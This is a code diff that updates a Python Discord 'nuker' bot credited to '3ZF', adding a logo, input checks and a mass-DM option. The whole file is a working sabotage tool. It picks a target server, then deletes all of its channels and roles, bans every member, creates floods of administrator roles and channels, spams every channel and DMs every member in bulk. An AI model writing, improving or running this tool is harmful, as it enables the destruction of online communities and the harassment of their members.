@@ -7,16 +7,29 @@ import random
 import asyncio
 import discord
 from discord.ext import commands
-from colorama import init, Fore, Back, Style
+from colorama import init, Fore, Style
+import concurrent.futures
 
-# تهيئة الألوان
 init(autoreset=True)
 
-# البانر (شعار البداية) - بسيط وقوي
+RED = Fore.RED + Style.BRIGHT
+RESET = Style.RESET_ALL
+
+LOGO = f"""
+{RED}
+██████╗  ██████╗ ███████╗███████╗
+╚════██╗██╔═████╗██╔════╝██╔════╝
+ █████╔╝██║██╔██║███████╗███████╗
+ ╚═══██╗████╔╝██║╚════██║╚════██║
+██████╔╝╚██████╔╝███████║███████║
+╚═════╝  ╚═════╝ ╚══════╝╚══════╝{RESET}
+"""
+
 BANNER = f"""
-{Back.RED}{Fore.WHITE}  ╔══════════════════════════════════════╗
-{Back.RED}{Fore.WHITE}  ║      DISCORD NUKER - POWER VERSION   ║
-{Back.RED}{Fore.WHITE}  ╚══════════════════════════════════════╝{Style.RESET_ALL}
+{RED}╔══════════════════════════════════════╗
+{RED}║        ULTIMATE NUKE ENGINE        ║
+{RED}║        PROGRAMMED BY 3ZF           ║
+{RED}╚══════════════════════════════════════╝{RESET}
 """
 
 def clear_screen():
@@ -24,59 +37,53 @@ def clear_screen():
 
 def show_banner(user=None):
     clear_screen()
+    print(LOGO)
     print(BANNER)
     if user:
-        print(f"{Fore.GREEN}[+] Logged in as: {user}{Style.RESET_ALL}")
+        print(f"{RED}[+] LOGGED IN AS: {user}{RESET}")
 
-# إعداد البوت
 show_banner()
-TOKEN = input(f"{Fore.CYAN}> Enter Token: {Style.RESET_ALL}").strip()
+TOKEN = input(f"{RED}> ENTER TOKEN: {RESET}").strip()
 
-# إعدادات النوايا (Intents) لتعمل كل الأوامر
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 
 selected_guild = None
 running = True
+semaphore = asyncio.Semaphore(500)
 
 @bot.event
 async def on_ready():
     global selected_guild
     show_banner(bot.user.name)
-
-    # جلب السيرفرات وترتيبها حسب عدد الأعضاء (الأقوى أولاً)
     servers = sorted(list(bot.guilds), key=lambda x: x.member_count, reverse=True)
-    
-    print(f"\n{Fore.YELLOW}Servers ({len(servers)}):{Style.RESET_ALL}")
+    print(f"\n{RED}SERVERS ({len(servers)}):{RESET}")
     for i, s in enumerate(servers):
-        print(f"  {Fore.CYAN}{i+1}. {s.name:<25} (Members: {s.member_count}){Style.RESET_ALL}")
-
+        print(f"  {RED}{i+1}. {s.name[:20]:<20} (MEMBERS: {s.member_count}){RESET}")
     while True:
         try:
-            idx = int(input(f"\n{Fore.CYAN}> Choose server number: {Style.RESET_ALL}")) - 1
+            idx = int(input(f"\n{RED}> CHOOSE SERVER NUMBER: {RESET}")) - 1
             if 0 <= idx < len(servers):
                 selected_guild = servers[idx]
                 break
         except ValueError:
             pass
-        print(f"{Fore.RED}[-] Invalid number{Style.RESET_ALL}")
-
-    print(f"\n{Fore.GREEN}[+] Target: {selected_guild.name}{Style.RESET_ALL}")
+        print(f"{RED}[-] INVALID NUMBER{RESET}")
+    print(f"\n{RED}[+] TARGET: {selected_guild.name}{RESET}")
     await main_menu()
 
 async def main_menu():
     global running
     while running:
-        # رسم الجدول المنظم زي ما طلبت
-        print(f"\n┌─────────────────────────────────────────────────────────────┐")
-        print(f"│ [1] Delete Channels   |   [2] Delete Roles     │")
-        print(f"│ [3] Ban Members       |   [4] Create Channels  │")
-        print(f"│ [5] Create Admin Roles|   [6] Spam Messages    │")
-        print(f"│ [7] Change Server Name|   [8] Exit             │")
-        print(f"└─────────────────────────────────────────────────────────────┘")
-
-        choice = input(f"\n{Fore.CYAN}> Choose option: {Style.RESET_ALL}").strip()
-
+        print(f"\n{RED}┌─────────────────────────────────────────────────────────────┐")
+        print(f"{RED}│ [1] DELETE CHANNELS   |   [2] DELETE ROLES     │")
+        print(f"{RED}│ [3] BAN MEMBERS       |   [4] CREATE CHANNELS  │")
+        print(f"{RED}│ [5] CREATE ADMIN ROLES|   [6] SPAM MESSAGES    │")
+        print(f"{RED}│ [7] CHANGE SERVER NAME|   [8] DM ALL MEMBERS   │")
+        print(f"{RED}│ [9] EXIT                                        │")
+        print(f"{RED}└─────────────────────────────────────────────────────────────┘")
+        print(f"\n{RED}            PROGRAMMED BY 3ZF{RESET}")
+        choice = input(f"\n{RED}> CHOOSE OPTION: {RESET}").strip()
         if choice == "1": await delete_channels()
         elif choice == "2": await delete_roles()
         elif choice == "3": await ban_members()
@@ -84,107 +91,207 @@ async def main_menu():
         elif choice == "5": await create_roles()
         elif choice == "6": await spam_messages()
         elif choice == "7": await change_server_name()
-        elif choice == "8":
+        elif choice == "8": await dm_all_members()
+        elif choice == "9":
             running = False
-            print(f"\n{Fore.GREEN}[+] Exiting...{Style.RESET_ALL}")
+            print(f"\n{RED}[+] EXITING...{RESET}")
             await bot.close()
             sys.exit(0)
         else:
-            print(f"{Fore.RED}[-] Invalid option{Style.RESET_ALL}")
-
-# --- العمليات السريعة (High Speed Operations) ---
+            print(f"{RED}[-] INVALID OPTION{RESET}")
 
 async def delete_channels():
-    print(f"\n{Fore.YELLOW}[+] Deleting all channels...{Style.RESET_ALL}")
-    # تنفيذ متوازي لحذف كل القنوات في نفس اللحظة
-    await asyncio.gather(*[ch.delete() for ch in selected_guild.channels], return_exceptions=True)
-    print(f"{Fore.GREEN}[+] Channels deleted!{Style.RESET_ALL}")
+    print(f"\n{RED}[+] DELETING ALL CHANNELS...{RESET}")
+    try:
+        tasks = []
+        for ch in selected_guild.channels:
+            tasks.append(ch.delete())
+        await asyncio.gather(*tasks, return_exceptions=True)
+        print(f"{RED}[+] CHANNELS DELETED!{RESET}")
+    except Exception as e:
+        print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
 
 async def delete_roles():
-    print(f"\n{Fore.YELLOW}[+] Deleting all roles...{Style.RESET_ALL}")
-    # حذف كل الرتب ما عدا رتبة Everyone الأساسية
-    roles = [r for r in selected_guild.roles if r.name != "@everyone"]
-    await asyncio.gather(*[r.delete() for r in roles], return_exceptions=True)
-    print(f"{Fore.GREEN}[+] Roles deleted!{Style.RESET_ALL}")
+    print(f"\n{RED}[+] DELETING ALL ROLES...{RESET}")
+    try:
+        roles = [r for r in selected_guild.roles if r.name != "@everyone"]
+        tasks = []
+        for r in roles:
+            tasks.append(r.delete())
+        await asyncio.gather(*tasks, return_exceptions=True)
+        print(f"{RED}[+] ROLES DELETED!{RESET}")
+    except Exception as e:
+        print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
 
 async def ban_members():
-    confirm = input(f"{Fore.RED}> Ban all members? (yes/no): {Style.RESET_ALL}").lower()
+    confirm = input(f"{RED}> BAN ALL MEMBERS? (YES/NO): {RESET}").lower()
     if confirm != "yes":
-        print(f"{Fore.RED}[-] Cancelled{Style.RESET_ALL}")
+        print(f"{RED}[-] CANCELLED{RESET}")
         return
-    
-    print(f"\n{Fore.YELLOW}[+] Banning members...{Style.RESET_ALL}")
+    print(f"\n{RED}[+] BANNING MEMBERS...{RESET}")
     try:
-        # جلب الأعضاء والتعامل مع الأخطاء بشكل متوازي
-        members = [m for m in selected_guild.members if m.id != bot.user.id]
-        tasks = [m.ban(reason="Nuked") for m in members]
+        members = [m for m in selected_guild.members if m.id != bot.user.id and not m.bot]
+        if not members:
+            print(f"{RED}[-] NO MEMBERS TO BAN{RESET}")
+            return
+        tasks = []
+        for m in members:
+            tasks.append(m.ban(reason="NUKE"))
         await asyncio.gather(*tasks, return_exceptions=True)
-        print(f"{Fore.GREEN}[+] Members banned!{Style.RESET_ALL}")
+        print(f"{RED}[+] {len(members)} MEMBERS BANNED!{RESET}")
     except Exception as e:
-        print(f"{Fore.RED}[-] Error banning: {e}{Style.RESET_ALL}")
+        print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
 
 async def create_channels():
     try:
-        count = int(input(f"{Fore.CYAN}> How many channels?: {Style.RESET_ALL}"))
+        count = int(input(f"{RED}> HOW MANY CHANNELS?: {RESET}"))
+        if count <= 0:
+            print(f"{RED}[-] ENTER A POSITIVE NUMBER{RESET}")
+            return
     except ValueError:
-        print(f"{Fore.RED}[-] Enter a number{Style.RESET_ALL}")
+        print(f"{RED}[-] ENTER A NUMBER{RESET}")
         return
     
-    print(f"\n{Fore.YELLOW}[+] Creating channels...{Style.RESET_ALL}")
-    names = ["nuke", "hack", "3zf"]
-    tasks = []
-    for _ in range(count):
-        tasks.append(selected_guild.create_text_channel(names[_ % len(names)]))
+    print(f"\n{RED}[+] ENTER CHANNEL NAMES (TYPE 'DONE' TO FINISH):{RESET}")
+    names = []
+    while len(names) < count:
+        name = input(f"{RED}> NAME {len(names)+1}: {RESET}").strip()
+        if name.upper() == "DONE":
+            break
+        if name:
+            names.append(name)
     
-    await asyncio.gather(*tasks, return_exceptions=True)
-    print(f"{Fore.GREEN}[+] Created {count} channels!{Style.RESET_ALL}")
+    if not names:
+        print(f"{RED}[-] NO NAMES ENTERED{RESET}")
+        return
+    
+    print(f"\n{RED}[+] CREATING {len(names)} CHANNELS...{RESET}")
+    try:
+        tasks = []
+        for name in names:
+            tasks.append(selected_guild.create_text_channel(name))
+        await asyncio.gather(*tasks, return_exceptions=True)
+        print(f"{RED}[+] {len(names)} CHANNELS CREATED!{RESET}")
+    except Exception as e:
+        print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
 
 async def create_roles():
     try:
-        count = int(input(f"{Fore.CYAN}> How many roles?: {Style.RESET_ALL}"))
+        count = int(input(f"{RED}> HOW MANY ROLES?: {RESET}"))
+        if count <= 0:
+            print(f"{RED}[-] ENTER A POSITIVE NUMBER{RESET}")
+            return
     except ValueError:
-        print(f"{Fore.RED}[-] Enter a number{Style.RESET_ALL}")
+        print(f"{RED}[-] ENTER A NUMBER{RESET}")
         return
     
-    print(f"\n{Fore.YELLOW}[+] Creating admin roles...{Style.RESET_ALL}")
-    tasks = []
-    for _ in range(count):
-        color = random.randint(0, 0xFFFFFF)
-        tasks.append(selected_guild.create_role(name="nuke", color=discord.Color(color=color), permissions=discord.Permissions(administrator=True)))
+    print(f"\n{RED}[+] ENTER ROLE NAMES (TYPE 'DONE' TO FINISH):{RESET}")
+    names = []
+    while len(names) < count:
+        name = input(f"{RED}> NAME {len(names)+1}: {RESET}").strip()
+        if name.upper() == "DONE":
+            break
+        if name:
+            names.append(name)
     
-    await asyncio.gather(*tasks, return_exceptions=True)
-    print(f"{Fore.GREEN}[+] Created {count} admin roles!{Style.RESET_ALL}")
+    if not names:
+        print(f"{RED}[-] NO NAMES ENTERED{RESET}")
+        return
+    
+    print(f"\n{RED}[+] CREATING {len(names)} ADMIN ROLES...{RESET}")
+    try:
+        tasks = []
+        for name in names:
+            tasks.append(selected_guild.create_role(
+                name=name,
+                color=discord.Color.from_rgb(139, 0, 0),
+                permissions=discord.Permissions(administrator=True)
+            ))
+        await asyncio.gather(*tasks, return_exceptions=True)
+        print(f"{RED}[+] {len(names)} ADMIN ROLES CREATED!{RESET}")
+    except Exception as e:
+        print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
 
 async def spam_messages():
     try:
-        count = int(input(f"{Fore.CYAN}> Messages per channel?: {Style.RESET_ALL}"))
+        count = int(input(f"{RED}> MESSAGES PER CHANNEL?: {RESET}"))
+        if count <= 0:
+            print(f"{RED}[-] ENTER A POSITIVE NUMBER{RESET}")
+            return
     except ValueError:
-        print(f"{Fore.RED}[-] Enter a number{Style.RESET_ALL}")
+        print(f"{RED}[-] ENTER A NUMBER{RESET}")
         return
-        
-    msg = input(f"{Fore.CYAN}> Message content: {Style.RESET_ALL}")
     
-    # إنشاء مهام السبام لكل القنوات دفعة واحدة
-    tasks = []
-    for ch in selected_guild.text_channels:
-        for _ in range(count):
-            tasks.append(ch.send(msg))
-            
-    await asyncio.gather(*tasks, return_exceptions=True)
-    print(f"{Fore.GREEN}[+] Spam finished!{Style.RESET_ALL}")
+    msg = input(f"{RED}> MESSAGE CONTENT: {RESET}")
+    if not msg:
+        print(f"{RED}[-] MESSAGE CANNOT BE EMPTY{RESET}")
+        return
+    
+    text_channels = selected_guild.text_channels
+    if not text_channels:
+        print(f"{RED}[-] NO TEXT CHANNELS FOUND{RESET}")
+        return
+    
+    print(f"\n{RED}[+] SPAMMING {count} MESSAGES TO {len(text_channels)} CHANNELS...{RESET}")
+    try:
+        tasks = []
+        for ch in text_channels:
+            for _ in range(count):
+                tasks.append(ch.send(msg))
+        await asyncio.gather(*tasks, return_exceptions=True)
+        print(f"{RED}[+] SPAM COMPLETED!{RESET}")
+    except Exception as e:
+        print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
 
 async def change_server_name():
-    name = input(f"{Fore.CYAN}> New server name: {Style.RESET_ALL}")
+    name = input(f"{RED}> NEW SERVER NAME: {RESET}")
+    if not name:
+        print(f"{RED}[-] NAME CANNOT BE EMPTY{RESET}")
+        return
     try:
         await selected_guild.edit(name=name)
-        print(f"{Fore.GREEN}[+] Server name changed to: {name}{Style.RESET_ALL}")
-    except Exception:
-        print(f"{Fore.RED}[-] Failed to change name{Style.RESET_ALL}")
+        print(f"{RED}[+] SERVER NAME CHANGED TO: {name}{RESET}")
+    except Exception as e:
+        print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
 
-# تشغيل البوت
+async def dm_all_members():
+    try:
+        count = int(input(f"{RED}> HOW MANY MESSAGES PER MEMBER?: {RESET}"))
+        if count <= 0:
+            print(f"{RED}[-] ENTER A POSITIVE NUMBER{RESET}")
+            return
+    except ValueError:
+        print(f"{RED}[-] ENTER A NUMBER{RESET}")
+        return
+    
+    msg = input(f"{RED}> MESSAGE CONTENT: {RESET}")
+    if not msg:
+        print(f"{RED}[-] MESSAGE CANNOT BE EMPTY{RESET}")
+        return
+    
+    members = [m for m in selected_guild.members if m.id != bot.user.id and not m.bot]
+    if not members:
+        print(f"{RED}[-] NO MEMBERS TO DM{RESET}")
+        return
+    
+    print(f"\n{RED}[+] SENDING {count} DMS TO {len(members)} MEMBERS...{RESET}")
+    
+    try:
+        tasks = []
+        for member in members:
+            for _ in range(count):
+                tasks.append(member.send(msg))
+        await asyncio.gather(*tasks, return_exceptions=True)
+        print(f"{RED}[+] DMS SENT SUCCESSFULLY!{RESET}")
+    except Exception as e:
+        print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
+
 if __name__ == "__main__":
     try:
-        bot.run(TOKEN)
-    except Exception:
-        print(f"{Fore.RED}[-] Invalid token{Style.RESET_ALL}")
+        bot.run(TOKEN, reconnect=True)
+    except discord.LoginFailure:
+        print(f"{RED}[-] INVALID TOKEN{RESET}")
+        sys.exit(1)
+    except Exception as e:
+        print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
         sys.exit(1)
